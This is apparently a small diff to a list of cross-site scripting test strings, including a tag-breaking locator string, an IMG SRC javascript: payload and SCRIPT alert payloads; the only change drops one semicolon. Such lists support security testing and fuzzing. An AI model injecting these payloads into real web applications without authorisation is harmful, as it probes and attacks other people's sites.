@@ -1,4 +1,4 @@
 '';!--"<XSS>=&{()}
 <IMG SRC=JaVaScRiPt:alert('XSS')>
-<SCRIPT>alert('XSS');</SCRIPT>
+<SCRIPT>alert('XSS')</SCRIPT>
 javascript:alert(1)
